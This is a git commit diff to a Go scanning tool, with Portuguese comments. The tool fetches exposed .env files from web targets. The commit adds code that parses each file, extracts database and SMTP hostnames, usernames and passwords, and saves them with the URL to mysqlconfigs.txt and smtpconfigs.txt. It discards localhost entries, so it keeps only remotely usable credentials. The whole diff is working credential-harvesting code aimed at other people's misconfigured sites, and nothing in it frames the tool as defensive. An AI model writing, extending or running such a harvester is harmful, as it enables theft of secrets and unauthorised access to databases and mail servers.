3e8311649663c2b456bd45f5cd7aa897d2f7f541
rafaelwdornelas <rafaelwdornelasstl@gmail.com>
2025-02-11 17:15:31 -0300

    Update env.go

--- internal/scanner/env.go
+++ internal/scanner/env.go
@@ -65,6 +65,89 @@ func CheckEnv(baseURL string) {
 			utils.LogSave(envURL, "env-production.txt")
 			utils.Warning("Arquivo .env válido encontrado em %s", envURL)
 			utils.BeepAlert()
+
+			envValues := extractENVValues(content)
+
+			if len(envValues) > 0 {
+				// Se quiser tratar especificamente a lógica de DB_HOST, por exemplo:
+				if dbhost, ok := envValues["DB_HOST"]; ok {
+					// Caso você queira ignorar hosts locais:
+					if dbhost == "localhost" ||
+						dbhost == "127.0.0.1" ||
+						dbhost == "localhost:3306" ||
+						dbhost == "127.0.0.1:3306" ||
+						dbhost == "127.0.0.1:8889" ||
+						dbhost == "" {
+						utils.Info("DB_HOST é %s, dados não serão salvos em mysqlconfigs.txt", dbhost)
+					} else {
+						//vertifica se tem null ou vazio
+						if envValues["DB_USERNAME"] == "null" ||
+							envValues["DB_PASSWORD"] == "null" ||
+							envValues["DB_DATABASE"] == "null" ||
+							envValues["DB_USER"] == "null" ||
+							envValues["DB_PASS"] == "null" {
+							utils.Info("DB_USERNAME, DB_PASSWORD, DB_DATABASE, DB_USER ou DB_PASS é nulo ou vazio, dados não serão salvos em mysqlconfigs.txt")
+						} else {
+							var envOutput string = fmt.Sprintf("URL: %s HOST:%s USERNAME:%s%s PASSWORD:%s%s DATABASE:%s", envURL, envValues["DB_HOST"], envValues["DB_USERNAME"], envValues["DB_USER"], envValues["DB_PASSWORD"], envValues["DB_PASS"], envValues["DB_DATABASE"])
+
+							// Salva a saída no arquivo mysqlconfigs.txt
+							utils.LogSave(envOutput, "mysqlconfigs.txt")
+							utils.Warning(envOutput)
+							utils.BeepAlert()
+						}
+					}
+				}
+
+				// SMTP_HOST, por exemplo:
+				if smtphost, ok := envValues["MAIL_HOST"]; ok {
+					// Caso você queira ignorar hosts locais:
+					if smtphost == "localhost" || smtphost == "127.0.0.1" || smtphost == "localhost:3306" || smtphost == "" {
+						utils.Info("SMTP_HOST é %s, dados não serão salvos em smtpconfigs.txt", smtphost)
+					} else {
+						//vertifica se tem null ou vazio
+						if envValues["MAIL_USERNAME"] == "null" || envValues["MAIL_PASSWORD"] == "null" || envValues["MAIL_USER"] == "null" {
+							utils.Info("MAIL_USERNAME, MAIL_PASSWORD ou MAIL_USER é nulo ou vazio, dados não serão salvos em smtpconfigs.txt")
+						} else {
+							var envOutput string = fmt.Sprintf("URL: %s MAIL_HOST:%s MAIL_USERNAME:%s%s MAIL_PASSWORD:%s%s", envURL, envValues["MAIL_HOST"], envValues["MAIL_USERNAME"], envValues["MAIL_USER"], envValues["MAIL_PASS"], envValues["MAIL_PASSWORD"])
+							// Salva a saída no arquivo smtpconfigs.txt
+							utils.LogSave(envOutput, "smtpconfigs.txt")
+							utils.Warning(envOutput)
+							utils.BeepAlert()
+						}
+					}
+				}
+			}
 		}
 	}
+}
+
+// extractENVValues extrai as variáveis do tipo CHAVE=VALOR de um conteúdo .env
+func extractENVValues(content string) map[string]string {
+	envMap := make(map[string]string)
+
+	// Divide o conteúdo em linhas
+	lines := strings.Split(content, "\n")
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+
+		// Ignora linhas vazias ou que começam com comentário (#)
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+
+		// Divide em no máximo 2 partes (CHAVE=VALOR)
+		parts := strings.SplitN(line, "=", 2)
+		if len(parts) == 2 {
+			chave := strings.TrimSpace(parts[0])
+			valor := strings.TrimSpace(parts[1])
+			//retira aspas do valor
+			valor = strings.Trim(valor, "\"")
+			//retira aspas simples do valor
+			valor = strings.Trim(valor, "'")
+			// Armazena no map
+			envMap[chave] = valor
+		}
+	}
+
+	return envMap
 }
